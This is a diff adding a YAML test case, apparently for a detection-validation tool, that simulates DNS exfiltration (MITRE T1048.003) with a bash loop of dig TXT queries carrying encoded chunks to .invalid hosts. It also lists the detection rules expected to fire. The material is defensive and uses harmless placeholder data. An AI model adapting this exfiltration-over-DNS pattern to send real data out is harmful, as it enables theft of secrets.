@@ -1,0 +1,48 @@
+id: eye-705-dns-exfil-burst
+name: Burst of dig queries with base32 chunks
+description: |
+  Mimics T1048.003 (Exfiltration Over Alternative Protocol: Unencrypted
+  Non-C2): a 10-query burst of dig TXT lookups against .invalid
+  subdomains carrying base32-padded chunks. Reuses the same slither
+  rules as the c2 dns-tunnel pack — exfil is structurally identical at
+  the wire shape.
+
+attack:
+  technique: T1048.003
+  tactic: TA0010
+
+destructiveness: low
+platforms: [linux]
+
+execute:
+  - shell: bash
+    command: |
+      mkdir -p /tmp/eyeexam-705
+      if ! command -v dig >/dev/null 2>&1; then
+        echo "dig not installed; skipping" > /tmp/eyeexam-705/out
+        exit 0
+      fi
+      for i in 01 02 03 04 05 06 07 08 09 10; do
+        chunk="MFRGGZDFMZTWQ2LK${i}5UXG6JBA"
+        dig +short +tries=1 +time=1 TXT "${chunk}====.eye705.invalid" \
+          >> /tmp/eyeexam-705/dig.out 2>&1 || true
+      done
+      echo "eye-705 dns exfil burst complete (10 queries)"
+
+cleanup:
+  - shell: bash
+    command: |
+      rm -rf /tmp/eyeexam-705
+
+verify_cleanup:
+  - shell: bash
+    command: |
+      test ! -e /tmp/eyeexam-705
+
+expected_detections:
+  - sigma_id: 8b7c4d00-0001-4000-8000-000000000022
+    backend: slither
+    description: proc-dns-tunnel-marker — fires on each dig with '====' in argv
+  - sigma_id: 8b7c4d00-0001-4000-8000-000000000021
+    backend: slither
+    description: proc-dns-suspicious-query — also fires (TXT to .invalid)
